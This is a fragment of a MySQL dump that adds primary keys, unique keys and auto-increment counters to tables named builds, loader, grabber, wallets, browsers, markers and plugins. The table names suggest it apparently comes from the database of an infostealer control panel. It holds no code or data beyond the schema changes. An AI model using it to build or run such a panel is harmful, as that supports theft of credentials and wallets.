ALTER TABLE `plugins`
  ADD PRIMARY KEY (`plugin_id`);

ALTER TABLE `programs`
  ADD PRIMARY KEY (`rule_id`);

ALTER TABLE `settings`
  ADD PRIMARY KEY (`setting_key`);

ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `username` (`username`);

ALTER TABLE `users_sessions`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `uniq_session` (`session_id`),
  ADD KEY `user_id` (`user_id`);

ALTER TABLE `users_tokens`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `token` (`token`),
  ADD KEY `user_id` (`user_id`);

ALTER TABLE `versions`
  ADD PRIMARY KEY (`id`);

ALTER TABLE `wallets`
  ADD PRIMARY KEY (`rule_id`);

ALTER TABLE `blocklist`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;

ALTER TABLE `browsers`
  MODIFY `browser_id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=23;

ALTER TABLE `builds`
  MODIFY `build_id` int NOT NULL AUTO_INCREMENT;

ALTER TABLE `downloads`
  MODIFY `id` int UNSIGNED NOT NULL AUTO_INCREMENT;

ALTER TABLE `grabber`
  MODIFY `rule_id` int NOT NULL AUTO_INCREMENT;

ALTER TABLE `loader`
  MODIFY `loader_id` int NOT NULL AUTO_INCREMENT;

ALTER TABLE `logs`
  MODIFY `log_id` int NOT NULL AUTO_INCREMENT;

ALTER TABLE `markers`
  MODIFY `rule_id` int NOT NULL AUTO_INCREMENT;

ALTER TABLE `plugins`
  MODIFY `plugin_id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=104;

ALTER TABLE `programs`
  MODIFY `rule_id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=12;

ALTER TABLE `users`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

ALTER TABLE `users_sessions`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;

ALTER TABLE `users_tokens`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;

ALTER TABLE `versions`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;

ALTER TABLE `wallets`
  MODIFY `rule_id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=28;
COMMIT;